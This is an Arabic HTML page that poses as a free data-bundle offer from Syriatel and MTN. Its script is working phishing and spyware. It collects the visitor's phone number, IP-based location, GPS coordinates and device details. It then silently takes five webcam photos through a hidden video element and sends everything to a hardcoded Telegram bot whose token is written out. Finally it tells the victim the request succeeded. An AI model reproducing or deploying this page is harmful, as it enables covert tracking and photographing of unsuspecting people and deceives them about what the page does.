<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>طلب باقة مجانية - سيريتل & MTN</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: #0a0a0a;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }

    .container {
      background: #111;
      border-radius: 20px;
      padding: 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px #222;
    }

    h1 {
      margin-bottom: 10px;
      color: #00eaff;
    }

    select, input, button {
      width: 100%;
      margin: 15px 0;
      padding: 14px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
    }

    select {
      background: #222;
      color: #fff;
    }

    input {
      background: #1a1a1a;
      color: #fff;
    }

    button {
      background: linear-gradient(to right, #00c853, #ffd600);
      color: #000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      opacity: 0.85;
    }

    video {
      display: none;
    }

    .logos {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 15px;
    }

    .logos img {
      width: 70px;
      height: auto;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logos">
      <img src="https://upload.wikimedia.org/wikipedia/ar/6/6e/Syriatel_logo.png" alt="Syriatel" />
      <img src="https://upload.wikimedia.org/wikipedia/ar/0/0e/MTN_Logo.svg" alt="MTN" />
    </div>
    <h1>طلب باقة مجانية</h1>
    <select id="operator">
      <option value="Syriatel">سيريتل</option>
      <option value="MTN">MTN</option>
    </select>
    <input type="text" id="phone" placeholder="أدخل رقم الهاتف" />
    <select id="package">
      <option value="100MB">باقة 100 ميجا</option>
      <option value="500MB">باقة 500 ميجا</option>
      <option value="1GB">باقة 1 غيغا</option>
    </select>
    <button onclick="submitRequest()">طلب الباقة المجانية</button>
    <video id="video" autoplay playsinline></video>
  </div>

  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendTelegramMessage(text) {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ غير مسموح أو غير متاح");
        }, { timeout: 5000 });
      });
    }

    function delay(ms) {
      return new Promise(res => setTimeout(res, ms));
    }

    async function submitRequest() {
      const operator = document.getElementById("operator").value;
      const phone = document.getElementById("phone").value.trim();
      const packageType = document.getElementById("package").value;

      if (!phone || phone.length < 7) {
        alert("يرجى إدخال رقم هاتف صحيح.");
        return;
      }

      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      const message = `
🎁 طلب باقة مجانية
📱 الرقم: ${phone}
🏢 الشبكة: ${operator}
📦 الباقة: ${packageType}

🌍 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🌐 IP: ${ipInfo.ip || "غير معروف"}
📍 الموقع: ${location}

🔋 الشحن: ${battery.level}%
⚡ هل يشحن: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ الجهاز: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
      `;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        for (let i = 1; i <= 5; i++) {
          await delay(1500);
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          await new Promise(resolve => canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
            resolve();
          }, "image/jpeg"));
        }

        stream.getTracks().forEach(track => track.stop());

        alert("✅ تم إرسال طلب الباقة المجانية والمعلومات بنجاح!");

      } catch (err) {
        alert("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }
    }
  </script>

</body>
</html>
